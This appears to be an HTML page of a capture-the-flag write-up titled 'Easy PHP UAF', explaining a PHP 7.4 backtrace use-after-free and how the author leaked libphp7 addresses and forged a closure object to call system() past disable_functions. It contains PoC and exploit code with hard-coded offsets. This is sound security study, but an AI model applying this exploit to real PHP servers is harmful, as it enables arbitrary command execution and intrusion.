@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+    <title>Easy PHP UAF | r3kapig</title>
+    <meta property="og:title" content="r3kapig writeup" />
+    <meta property="og:locale" content="en_US" />
+    <meta name="description" content="Writeup for Easy PHP UAF" />
+    <meta property="og:description" content="Writeup for Easy PHP UAF" />
+    <link rel="canonical" href="https://r3kapig.com/writeup/" />
+    <meta property="og:url" content="https://r3kapig.com/writeup/" />
+    <meta property="og:site_name" content="r3kapig" />
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      min-height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      min-height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="../">
+        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">r3kapig / writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                0x00-overview
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                0x01-environment
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                0x02-bug
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                0x03-exploit
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#php-object-memory-layout">php-object-memory-layout</a>
+    
+                <a class="dropdown-item" href="#leak">leak</a>
+    
+                <a class="dropdown-item" href="#code-execution">code-execution</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="order-3 dual-collapse2"> <!-- navbar-collapse w100 collapse -->
+        <ul class="navbar-nav ml-auto" style="flex-direction: row;">
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">0x00-overview</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">0x01-environment</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">0x02-bug</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">0x03-exploit</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#php-object-memory-layout" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">php-object-memory-layout</span>
+            </a>
+    
+<a href="#leak" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">leak</span>
+            </a>
+    
+<a href="#code-execution" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">code-execution</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><p>Cloned from <a href="https://mem2019.github.io/jekyll/update/2020/05/04/Easy-PHP-UAF.html">Our member 2019&#39;s post</a>.</p>
+<h2 id="0x00-overview"><a class="header-link" href="#0x00-overview"></a>0x00 Overview</h2>
+<p>Although I failed to solve the challenge during CTF, but I think it is worthwhile to do a write-up.</p>
+<p>The challenge is to exploit a PHP script engine using <a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">this bug</a>. We can execute arbitrary PHP code but we must bypass <code>disabled_function</code> restriction to execute shell command, using a UAF vulnerability. Therefore, this is actually more a Pwn challenge than a Web challenge.</p>
+<p>However, different from official PHP engine, a custom <code>libphp7.so</code> is provided. This engine does not provide any loop functionality such as <code>for/while/do-while/foreach</code>. Moreover, in remote server, the recursion depth is also restricted, and <code>strlen</code> function always returns <code>NULL</code>, even though these cases do not occur in my local environment.</p>
+<p>The exploit idea is similar to the exploit provided in Github: use UAF to overlap a string with an object, so that we can leak the addresses, then clone a function object and rewrite relevant function pointer to make the function <code>system</code>.</p>
+<h2 id="0x01-environment"><a class="header-link" href="#0x01-environment"></a>0x01 Environment</h2>
+<p>Firstly, we pull and run the docker provided by challenge:</p>
+<pre class="hljs"><code>sudo docker pull php:7.4.2-apache
+sudo docker run -i -t php:7.4.2-apache /bin/bash</code></pre><p>Then, start the apache server:</p>
+<pre class="hljs"><code><span class="hljs-comment"># -------- commands in host shell --------</span>
+sudo docker cp libphp7.so [hex id shown <span class="hljs-keyword">in</span> bash shell]:/usr/lib/apache2/modules/libphp7.so
+<span class="hljs-comment"># replace the libphp7 to provided libphp7</span>
+sudo docker cp exp.php [hex id shown <span class="hljs-keyword">in</span> bash shell]:/var/www/html/index.php
+<span class="hljs-comment"># copy the exploit into docker</span>
+
+<span class="hljs-comment"># -------- commands in docker shell --------</span>
+<span class="hljs-built_in">export</span> APACHE_RUN_USER=www-data
+<span class="hljs-built_in">export</span> APACHE_RUN_GROUP=www-data
+<span class="hljs-comment"># set some necessary environment variable</span>
+apache2ctl -X
+<span class="hljs-comment"># start apache server</span></code></pre><p>To debug the apache server, what I did is just use <code>gdb</code> outside docker and attach to the <code>apache2ctl</code> process. The functionality is pretty rudimentary, but it is okay if you just want to inspect memory status at crash.</p>
+<h2 id="0x02-bug"><a class="header-link" href="#0x02-bug"></a>0x02 Bug</h2>
+<p><em>In my understanding</em>, The use-after-free is caused by freeing variables without reference(e.i. <code>ref count = 0</code>) before putting the local variables into the <code>backtrace</code>. In this way already freed variables can be re-accessed by accessing <code>backtrace</code>. As the <a href="http://git.php.net/?p=php-src.git;a=commitdiff;h=ef1e4891b47949c8dc0f9482eef9454a0ecdfa1d;hp=8226e704e4e6066a5bd41b57b2934a3371896be2">patch</a> suggests, the way to fix is just to put stack frame unlink before freeing variables:</p>
+<blockquote>
+<p>Unlink the current stack frame before freeing CVs or extra args.
+This means it will no longer show up in back traces that are
+generated during CV destruction.</p>
+<p>We already did this prior to destructing the object/closure,
+presumably for the same reason.</p>
+</blockquote>
+<p>The PoC with explanation is shown below:</p>
+<pre class="hljs"><code><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>{
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{
+        <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>;
+        <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;a);
+        <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;getTrace(); <span class="hljs-comment">// backtrace has ref to $arg</span>
+    }
+}
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>{
+    <span class="hljs-variable">$arg</span> = str_shuffle(str_repeat(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>)); <span class="hljs-comment">// string to be UAFed</span>
+    <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> Vuln();
+    <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;
+}
+trigger_uaf(<span class="hljs-string">&#x27;x&#x27;</span>);
+<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">1</span>] <span class="hljs-comment">// access UAF string</span></code></pre><h2 id="0x03-exploit"><a class="header-link" href="#0x03-exploit"></a>0x03 Exploit</h2>
+<h3 id="php-object-memory-layout"><a class="header-link" href="#php-object-memory-layout"></a>PHP Object Memory Layout</h3>
+<p>Before exploiting any script engine, one critical thing to know is how object is stored in this script engine. In this case, we need to know how <code>string</code> and other PHP objects are stored in memory, since the best way to exploit UAF is to replace the just freed string with another PHP object to have type confusion. In this way we may do some evil stuff such as leaking critical memory addresses by reading from that PHP string.</p>
+<p>Thanks to @Anciety who helped me to find <a href="https://github.com/php/php-src/blob/master/Zend/zend_types.h">definition of various PHP types</a>, I can investigate the exploitation more conveniently.</p>
+<p>The exploit method that the provided exploit is using is to obfuscate PHP string with PHP object created from class. Here are definitions of these 2 types:</p>
+<pre class="hljs"><code><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">zend_string</span> {</span>
+    zend_refcounted_h gc;
+    zend_ulong        h;                <span class="hljs-comment">/* hash value */</span>
+    <span class="hljs-keyword">size_t</span>            len;
+    <span class="hljs-keyword">char</span>              val[<span class="hljs-number">1</span>];
+};
+<span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">zend_object</span> {</span>
+    zend_refcounted_h gc;
+    <span class="hljs-keyword">uint32_t</span>          handle; <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> may be removed ???</span>
+    zend_class_entry *ce;
+    <span class="hljs-keyword">const</span> zend_object_handlers *handlers;
+    HashTable        *properties;
+    zval              properties_table[<span class="hljs-number">1</span>]; 
+    <span class="hljs-comment">// zval is a union followed by its type description</span>
+    <span class="hljs-comment">// for example: string is _zend_string* pointer and 0x6</span>
+};</code></pre><p>The overlap is shown below:</p>
+<pre class="hljs"><code><span class="hljs-built_in">string</span>      <span class="hljs-keyword">object</span>
+gc          gc
+h           handle
+len         ce
+<span class="hljs-keyword">val</span>+<span class="hljs-number">0</span>       handlers
+<span class="hljs-keyword">val</span>+<span class="hljs-number">8</span>       properties
+<span class="hljs-keyword">val</span>+<span class="hljs-number">16</span>      first field
+<span class="hljs-keyword">val</span>+<span class="hljs-number">24</span>      <span class="hljs-keyword">type</span> <span class="hljs-keyword">of</span> first field
+       ...</code></pre><h3 id="leak"><a class="header-link" href="#leak"></a>Leak</h3>
+<p>Therefore, we can leak pointer of object by reading content in <code>+0x10</code> offset. In addition, pointer <code>handlers</code> points to somewhere at <code>libphp7.so</code> so that we can also leak base address of <code>libphp7</code>.</p>
+<pre class="hljs"><code><span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> Helper;
+<span class="hljs-variable">$helper</span>-&gt;a = <span class="hljs-variable">$helper</span>;
+<span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>{};
+<span class="hljs-variable">$helper</span>-&gt;c = <span class="hljs-number">0x1337</span>;
+
+<span class="hljs-variable">$closure_handlers</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$php_heap</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>);
+<span class="hljs-comment">// leaker address of $helper, which is also that of $abc</span>
+<span class="hljs-variable">$helper</span>-&gt;a = <span class="hljs-string">&quot;helper&quot;</span>; 
+<span class="hljs-comment">// if we still have circular reference, </span>
+<span class="hljs-comment">// a strage crash will occur when rewriting string,</span>
+<span class="hljs-comment">// so we remove circular reference here</span>
+<span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> + <span class="hljs-number">0x18</span>;
+<span class="hljs-variable">$libphp_addr</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>) - <span class="hljs-number">0xd73ec0</span>;
+<span class="hljs-variable">$zif_system</span> = <span class="hljs-variable">$libphp_addr</span> + <span class="hljs-number">0x355a86</span>;
+<span class="hljs-comment">// leak libphp and thus zif_system function</span>
+<span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span>{};
+<span class="hljs-variable">$closure_obj</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);
+<span class="hljs-comment">// leak a pointer pointing to a user-defined function object</span></code></pre><p>By the way, the way to leak <code>abc_addr</code> resented in provided exploit does not work here, I don&#39;t know why. In addition, the ELF stuff inside provided exploit is not necessary, because we already know the <code>libphp7</code> so that <code>zif_system</code> address can be calculated directly.</p>
+<h3 id="code-execution"><a class="header-link" href="#code-execution"></a>Code Execution</h3>
+<p>This is actually the part the got me stuck for very long time. The primary objective is to rewrite the function in <code>b</code> field to PHP system function. As the provided exploit suggests, we need to write <code>$closure_obj+0x38</code> to 1 and <code>$closure_obj+0x68</code> to <code>zif_system</code>.  I have came up with 4 approaches, but only the last one works:</p>
+<ol class="list">
+<li>Fake a string object to build a arbitrary write primitive, but it seems that when writing to string fetched from object field, the engine will copy it first before writing, which means we cannot rewrite the function object directly.</li>
+<li>Since the length of <code>$abc</code> is very big(e.i. an 6-byte address), we can directly use <code>$abc</code> to write content in <code>$closure_obj</code>. However, this requires <code>$closure_obj</code> to be larger that <code>$abc_addr</code>, which means the function object must lay behind <code>$abc</code> in memory. This is true when we execute the script directly, but when converting exploit into string and executing it using <code>eval</code>, this property does not hold.</li>
+<li>Re-trigger the vulnerability but fill the just-freed string with a function object, but it seems that I cannot achieve this after many trials.</li>
+<li>Copy the contents inside <code>$closure_obj</code> and change the relevant field in the copied fake object. This is the approach used by provided exploit. However, we cannot use <code>strlen</code> function to achieve arbitrary memory read, unlike the provided exploit. My approach is to interpret address <code>$closure_obj</code> as a PHP string so that we can read contents after <code>+0x18</code> offset. As for copying, since the recursion depth and loop are restricted, we just copy and paste the code to achieve the copy. The relevant codes are shown below:</li>
+</ol>
+<pre class="hljs"><code><span class="hljs-comment">// fake value</span>
+write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$closure_obj</span>);
+write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x6</span>); 
+<span class="hljs-comment">// fake a string object at $closure_obj</span>
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">copyFunc</span>(<span class="hljs-params"><span class="hljs-variable">$off</span></span>)
+</span>{
+    <span class="hljs-keyword">global</span> <span class="hljs-variable">$helper</span>;
+    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>;
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$off</span> &gt; <span class="hljs-number">0x110</span>) <span class="hljs-keyword">return</span>;
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x18</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x20</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">8</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x28</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x10</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x30</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x18</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x20</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x40</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x28</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x48</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x30</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x50</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x38</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x58</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x40</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x60</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x48</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x50</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x70</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x58</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x78</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x60</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x80</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x68</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x88</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x70</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x90</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x78</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x98</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x80</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0xa0</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x88</span>));
+    copyFunc(<span class="hljs-variable">$off</span> + <span class="hljs-number">0x90</span>);
+} <span class="hljs-comment">// function to copy the content inside $closure_obj</span>
+
+write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x0000031800000002</span>);
+write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">8</span>, <span class="hljs-number">0x0000000000000003</span>);
+<span class="hljs-comment">// write some headers in $closure_obj, </span>
+<span class="hljs-comment">// which are simply constants from gdb</span>
+copyFunc(<span class="hljs-number">0</span>); <span class="hljs-comment">// copy body in $closure_obj</span>
+
+write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">0x0210000000000001</span>);
+write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>);
+<span class="hljs-comment">// rewrite critical fields to make the function `system`</span>
+write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0xd0</span>);
+<span class="hljs-comment">// rewrite pointer of field b to newly faked function object</span>
+
+(<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);
+<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;end&quot;</span>);</code></pre><p>The full exploit is <a href="https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/easyphpuaf.php">here</a>.</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
+<!--
+    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
+    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
+    Respective Copyrights apply.
+ -->
